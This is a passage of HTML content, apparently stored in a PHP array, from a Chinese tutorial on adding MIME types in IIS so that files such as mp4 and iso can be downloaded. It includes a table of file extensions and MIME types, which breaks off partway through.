            'content' => '<p>经常我在用IIS做为下载服务器的时候有时传上去的文件比如 xxx.iso 文件名名是传上去了，但是用http打开的时候确显示为 404 文件不存在。</p><p>这其实是IIS对文件的一种保护，不在IIS指定的MIME类型里的文件显不会操作。</p><p>觉见的有 mp4 / flv / iso / 7z / apk 等扩展名的文件 iis 本身是没有指定MIME类型的，这类文件默认在IIS里是不能下载的。</p><p>&nbsp;我们可以打开IIS 在 xx本地服务器上 右键 -&gt; 属性 然后在 MIME类型 中查看已经的MIME格式</p><p style=\\"text-indent: 0px;\\"><img style=\\"cursor: pointer;\\" title=\\"点击查看大图\\" alt=\\"\\" src=\\"http://www.cr173.com/up/2013-1/20131115151153214119.jpg\\" width=\\"600\\"/></p><p>比如我们需要IIS支持 MP4 文件下载可以这么设置：（这里我们对IIS全局进行设置、如果只针对某一个站点可以直接设置站点的）</p><p>1、在 网站 上右键 选属性</p><p style=\\"text-indent: 0px;\\"><img style=\\"cursor: pointer;\\" title=\\"点击查看大图\\" alt=\\"\\" src=\\"http://www.cr173.com/up/2013-1/20131115151155276054.jpg\\" width=\\"600\\"/></p><p>2、在打开的 网站 属性 上选择 HTTP 头 再点 MIME类型按钮</p><p style=\\"text-indent: 0px;\\"><img style=\\"cursor: pointer;\\" title=\\"点击查看大图\\" alt=\\"\\" src=\\"http://www.cr173.com/up/2013-1/2013115115931.jpg\\"/></p><p>3、在打开的窗本中 点下 新建</p><p style=\\"text-indent: 0px;\\"><img style=\\"cursor: pointer;\\" title=\\"点击查看大图\\" alt=\\"\\" src=\\"http://www.cr173.com/up/2013-1/20131115151201382966.jpg\\" width=\\"600\\"/></p><p>4、在弹出的 MIME类型框上 扩展名 <strong>MP4</strong> MIME类型为： <strong>application/octet-stream</strong></p><p>&nbsp;</p><p>这样IIS就可以支持 MP4下载了。</p><p>下面列出一些常用的 扩展名的 MIME类型。</p><p>如果不知道MIME类型 可以写通用的: <span style=\\"color:#ff0000;\\">application/octet-stream</span></p><p><span style=\\"color:#ff0000;\\">还有一些规律如果是文本类的让IE可以直接打开的 MIME 可以为 text/扩展名</span></p><p><span style=\\"color:#ff0000;\\">如果是音频打开的时候让windows自动播放的可以用 audio/扩展名</span></p><p><br/></p><p><strong>扩展名类型/子类型</strong></p><table style=\\"BORDER-BOTTOM: #888888 1px solid; TEXT-ALIGN: left; BORDER-LEFT: #888888 1px solid; BACKGROUND-COLOR: #f9f9f9; MARGIN-TOP: 10px; WIDTH: 606px; BORDER-COLLAPSE: collapse; FONT-FAMILY: Arial, Helvetica, sans-serif; COLOR: #000000; FONT-SIZE: 12px; BORDER-TOP: #888888 1px solid; BORDER-RIGHT: #888888 1px solid\\" class=\\"dataintable\\" border=\\"0\\"><tbody><tr class=\\"firstRow\\"><td><br/></td><td><br/></td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">&nbsp;</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">323</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/h323</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">acx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/internet-property-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ai</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/postscript</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">aif</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/x-aiff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">aifc</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/x-aiff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">aiff</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/x-aiff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">asf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-ms-asf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">asr</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-ms-asf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">asx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-ms-asf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">au</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/basic</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">avi</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-msvideo</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">axs</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/olescript</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">bas</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/plain</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">bcpio</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-bcpio</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">bin</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">bmp</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/bmp</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">c</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/plain</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">cat</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-pkiseccat</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">cdf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-cdf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">cer</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-x509-ca-cert</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">class</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">clp</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msclip</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">cmx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-cmx</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">cod</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/cis-cod</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">cpio</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-cpio</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">crd</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-mscardfile</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">crl</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/pkix-crl</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">crt</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-x509-ca-cert</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">csh</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-csh</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">css</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/css</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dcr</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-director</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">der</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-x509-ca-cert</td></tr><tr><td 